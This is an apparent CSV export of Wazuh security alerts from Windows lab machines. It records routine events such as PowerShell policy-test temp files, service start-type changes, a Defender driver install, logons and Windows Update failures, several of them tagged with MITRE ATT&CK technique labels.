wazuh-alerts-4.x-2024.11.30,pPoHfJMBRlc-D5DFBx4q,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T07:44:06.480906000Z,2063,368,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,1,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:44:07.554",EventChannel,1732952647.1576848,"Nov 30, 2024 @ 07:44:07.554", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,S_oXfJMBRlc-D5DFSx-g,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:01:58.612
ProcessGuid: {15959494-C676-674A-B406-000000000D00}
ProcessId: 5072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_upsgjppr.hpz.ps1
CreationUtcTime: 2024-11-30 08:01:58.612
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:01:58.639071400Z,56035,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,26,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:01:59.463",EventChannel,1732953719.2205691,"Nov 30, 2024 @ 08:01:59.463", , , , , , , , , , , , ,5072, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C676-674A-B406-000000000D00},2024-11-30 08:01:58.612, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_upsgjppr.hpz.ps1,2024-11-30 08:01:58.612, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,TfoXfJMBRlc-D5DFSx-g,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-FMI6MML$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x284
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T08:01:59.667547400Z,228631,700,DESKTOP-FMI6MML,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,19,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 08:02:00.273",EventChannel,1732953720.2216026,"Nov 30, 2024 @ 08:02:00.273",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x284,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-FMI6MML$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,T_oXfJMBRlc-D5DFSx-g,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from demand start to auto start.""",0,2024-11-30T08:01:59.162222300Z,1786,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,9,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:00.586",EventChannel,1732953720.2225148,"Nov 30, 2024 @ 08:02:00.586", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,demand start, , ,auto start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,UPoXfJMBRlc-D5DFSx-g,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from auto start to demand start.""",0,2024-11-30T08:01:59.412648000Z,1787,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,10,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:00.588",EventChannel,1732953720.2226946,"Nov 30, 2024 @ 08:02:00.588", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,auto start, , ,demand start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,UfoXfJMBRlc-D5DFSx-g,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from demand start to auto start.""",0,2024-11-30T08:01:59.974741000Z,1788,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,11,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:00.601",EventChannel,1732953720.2228744,"Nov 30, 2024 @ 08:02:00.601", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,demand start, , ,auto start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,VPoXfJMBRlc-D5DFVx9V,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from demand start to auto start.""",0,2024-11-30T08:02:01.334134100Z,1790,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,14,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:02.804",EventChannel,1732953722.2234138,"Nov 30, 2024 @ 08:02:02.804", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,demand start, , ,auto start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,VfoXfJMBRlc-D5DFVx9V,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from demand start to auto start.""",0,2024-11-30T08:02:01.693792700Z,1792,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,15,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:02.846",EventChannel,1732953722.2235936,"Nov 30, 2024 @ 08:02:02.846", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,demand start, , ,auto start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,O_oVfJMBRlc-D5DFyB_b,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7045,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""A service was installed in the system.

Service Name:  MpKsldc8590db
Service File Name:  C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{6F0E3FA5-EAF3-4CB3-B04A-315F93631A12}\MpKslDrv.sys
Service Type:  kernel mode driver
Service Start Type:  demand start
Service Account:  """,0,2024-11-30T08:00:19.224659200Z,1781,1052,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,1,false,5,New Windows Service Created,"[""windows"",""windows_system""]",61138, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:00:20.638",EventChannel,1732953620.2141031,"Nov 30, 2024 @ 08:00:20.638", , , , , , , , , , , , , , , , , , , , , , , ,"[""Windows Service""]","[""T1543.003""]","[""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,kernel mode driver,C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{6F0E3FA5-EAF3-4CB3-B04A-315F93631A12}\\MpKslDrv.sys,demand start,MpKsldc8590db, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,PPoVfJMBRlc-D5DFyB_b,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2024-11-30 08:00:19.306
ProcessGuid: {D8AF36FB-C613-674A-5301-000000000900}
ProcessId: 2532
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: ""c:\windows\system32\\svchost.exe""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {D8AF36FB-C38E-674A-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=32569E403279B3FD2EDB7EBD036273FA,SHA256=C9A28DC8004C3E043CBF8E3A194FDA2B756CE90740DF2175488337281B485F69,IMPHASH=3A8297483C1777054C7BAFEA5E6A8853
ParentProcessGuid: {D8AF36FB-C391-674A-3500-000000000900}
ParentProcessId: 2440
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T08:00:19.310230400Z,50542,4148,DESKTOP-FMI6MML,1,2364,INFORMATION,Microsoft-Windows-Sysmon,1,true,12,Sysmon - Suspicious Process - svchost.exe,"[""windows"",""sysmon"",""sysmon_process-anomalies""]",61618,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:00:20.695",EventChannel,1732953620.2143356,"Nov 30, 2024 @ 08:00:20.695", , , , , , , ,{D8AF36FB-C38E-674A-E703-000000000000}, , , , ,2532, , , , , , ,"[""164.312.b""]","[""10.6.1"",""11.4""]","[""CC7.2"",""CC7.3"",""CC6.1"",""CC6.8""]","[""AU.6"",""SI.4""]","[""Process Injection""]","[""T1055""]","[""Defense Evasion"",""Privilege Escalation""]", , , ,svchost.exe,C:\\Windows\\System32\\svchost.exe,Microsoft® Windows® Operating System, , ,Host Process for Windows Services, , ,{D8AF36FB-C613-674A-5301-000000000900},2024-11-30 08:00:19.306,"MD5=32569E403279B3FD2EDB7EBD036273FA,SHA256=C9A28DC8004C3E043CBF8E3A194FDA2B756CE90740DF2175488337281B485F69,IMPHASH=3A8297483C1777054C7BAFEA5E6A8853", ,Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , ,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2024-11-30T08:00:19.310230400Z"",""eventRecordID"":""50542"",""processID"":""2364"",""threadID"":""4148"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-FMI6MML"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2024-11-30 08:00:19.306\r\nProcessGuid: {D8AF36FB-C613-674A-5301-000000000900}\r\nProcessId: 2532\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nFileVersion: 10.0.17134.1 (WinBuild.160101.0800)\r\nDescription: Host Process for Windows Services\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: svchost.exe\r\nCommandLine: \""c:\\windows\\system32\\\\svchost.exe\""\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {D8AF36FB-C38E-674A-E703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=32569E403279B3FD2EDB7EBD036273FA,SHA256=C9A28DC8004C3E043CBF8E3A194FDA2B756CE90740DF2175488337281B485F69,IMPHASH=3A8297483C1777054C7BAFEA5E6A8853\r\nParentProcessGuid: {D8AF36FB-C391-674A-3500-000000000900}\r\nParentProcessId: 2440\r\nParentImage: C:\\Program Files\\Windows Defender\\MsMpEng.exe\r\nParentCommandLine: \""C:\\Program Files\\Windows Defender\\MsMpEng.exe\""\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2024-11-30 08:00:19.306"",""processGuid"":""{D8AF36FB-C613-674A-5301-000000000900}"",""processId"":""2532"",""image"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""fileVersion"":""10.0.17134.1 (WinBuild.160101.0800)"",""description"":""Host Process for Windows Services"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""svchost.exe"",""commandLine"":""\\\""c:\\\\windows\\\\system32\\\\\\\\svchost.exe\\\"""",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{D8AF36FB-C38E-674A-E703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=32569E403279B3FD2EDB7EBD036273FA,SHA256=C9A28DC8004C3E043CBF8E3A194FDA2B756CE90740DF2175488337281B485F69,IMPHASH=3A8297483C1777054C7BAFEA5E6A8853"",""parentProcessGuid"":""{D8AF36FB-C391-674A-3500-000000000900}"",""parentProcessId"":""2440"",""parentImage"":""C:\\\\Program Files\\\\Windows Defender\\\\MsMpEng.exe"",""parentCommandLine"":""\\\""C:\\\\Program Files\\\\Windows Defender\\\\MsMpEng.exe\\\"""",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}", , , , ,{D8AF36FB-C391-674A-3500-000000000900},"\""C:\\Program Files\\Windows Defender\\MsMpEng.exe\""",0x3e7,2440,C:\\Windows\\system32\\,C:\\Program Files\\Windows Defender\\MsMpEng.exe,"\""c:\\windows\\system32\\\\svchost.exe\""",System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,OvoVfJMBRlc-D5DFjh9D,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,4616, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""The system time was changed.

Subject:
	Security ID:		S-1-5-19
	Account Name:		LOCAL SERVICE
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E5

Process Information:
	Process ID:	0x1308
	Name:		C:\Windows\System32\svchost.exe

Previous Time:		‎2024‎-‎11‎-‎30T07:59:58.104697300Z
New Time:		‎2024‎-‎11‎-‎30T07:59:58.104363600Z

This event is generated when the system time is changed. It is normal for the Windows Time Service, which runs with System privilege, to change the system time on a regular basis. Other system time changes may be indicative of attempts to tamper with the computer.""",1,2024-11-30T07:59:58.105979700Z,228407,3808,DESKTOP-FMI6MML,12288,4,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,1,false,5,System time changed.,"[""windows"",""windows_security"",""time_changed""]",60132,"[""IV_35.7.d""]","[""1.3"",""4.13""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:59:59.516",EventChannel,1732953599.2137796,"Nov 30, 2024 @ 07:59:59.516",0x3e5,NT AUTHORITY, , , , , , , , , ,S-1-5-19,0x1308,C:\\Windows\\System32\\svchost.exe, , , , ,LOCAL SERVICE,"[""164.312.b""]","[""10.6.1""]","[""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,2024-11-30T07:59:58.104697300Z,2024-11-30T07:59:58.104363600Z, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,SfoXfJMBRlc-D5DFPx_j,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, UpdateOrchestrator, {8B24B027-1DEE-BABB-9A95-3517DFB9C552}, 0,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER3DCE.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER3DEF.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER3DFD.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER3E1D.tmp.txt, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\NonCritical_10.0.17134.137_b5301a15e450c6e2c0efaeb0c58673ce6eb399_00000000_11fb6c22, 0, b162abe0-31b1-4ad6-960d-04eadd0bcbdb, 2147491840, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: UpdateOrchestrator
P9: {8B24B027-1DEE-BABB-9A95-3517DFB9C552}
P10: 0

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER3DCE.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER3DEF.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER3DFD.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER3E1D.tmp.txt

These files may be available here:
C:\ProgramData\Microsoft\Windows\WER\ReportArchive\NonCritical_10.0.17134.137_b5301a15e450c6e2c0efaeb0c58673ce6eb399_00000000_11fb6c22

Analysis symbol: 
Rechecking for solution: 0
Report Id: b162abe0-31b1-4ad6-960d-04eadd0bcbdb
Report Status: 2147491840
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T08:01:52.381432600Z,1698, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,11,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:01:52.836",EventChannel,1732953712.2197069,"Nov 30, 2024 @ 08:01:52.836", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,SvoXfJMBRlc-D5DFPx_j,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, Update;ScanForUpdates, {855E8A7C-ECB4-4CA3-B045-1DFA50104289}, 0,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER408D.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER409E.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER409F.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER40B0.tmp.txt, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\NonCritical_10.0.17134.137_a6ed102ec5cdfc54684621f4f181102e812bdb93_00000000_11fb76ef, 0, f3cd0d56-ed1b-41e4-8d6c-4446aad3597d, 2147491840, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: Update;ScanForUpdates
P9: {855E8A7C-ECB4-4CA3-B045-1DFA50104289}
P10: 0

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER408D.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER409E.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER409F.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER40B0.tmp.txt

These files may be available here:
C:\ProgramData\Microsoft\Windows\WER\ReportArchive\NonCritical_10.0.17134.137_a6ed102ec5cdfc54684621f4f181102e812bdb93_00000000_11fb76ef

Analysis symbol: 
Rechecking for solution: 0
Report Id: f3cd0d56-ed1b-41e4-8d6c-4446aad3597d
Report Status: 2147491840
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T08:01:54.881174900Z,1699, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,12,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:01:55.294",EventChannel,1732953715.2201370,"Nov 30, 2024 @ 08:01:55.294", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,bPocfJMBRlc-D5DFRR8u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:07:24.652
ProcessGuid: {15959494-C7BC-674A-BB06-000000000D00}
ProcessId: 6128
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ifdwmgva.cti.ps1
CreationUtcTime: 2024-11-30 08:07:24.652
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:07:24.668053000Z,56134,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,32,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:07:25.800",EventChannel,1732954045.2299138,"Nov 30, 2024 @ 08:07:25.800", , , , , , , , , , , , ,6128, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C7BC-674A-BB06-000000000D00},2024-11-30 08:07:24.652, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ifdwmgva.cti.ps1,2024-11-30 08:07:24.652, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,X_oYfJMBRlc-D5DF_R88,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:03:45.901
ProcessGuid: {15959494-C6E1-674A-B706-000000000D00}
ProcessId: 5284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_114afrbm.pq4.ps1
CreationUtcTime: 2024-11-30 08:03:45.901
